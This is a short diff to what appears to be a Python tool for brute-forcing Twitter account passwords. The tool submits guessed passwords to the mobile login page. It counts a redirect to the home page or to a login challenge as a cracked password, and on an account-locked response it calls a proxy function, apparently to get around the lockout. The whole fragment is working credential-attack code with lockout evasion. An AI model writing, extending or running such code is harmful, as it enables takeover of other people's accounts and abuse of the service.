@@ -90,7 +90,10 @@ def twitter():
             brows.method = "POST"
             submit = brows.submit()
             if submit.geturl() == "https://mobile.twitter.com/home":
-                print("{}True Password Found {}".format(G,password))
+                print("{}[True][+] Password Found [{}][+]".format(G,password))
+                break
+	    elif 'https://mobile.twitter.com/account/login_challenge' in submit.geturl():
+                print("{}[True][+] Password Found [{}][+]".format(G,password))
                 break
             elif 'https://mobile.twitter.com/account/locked' in submit.geturl():
                 proxy()
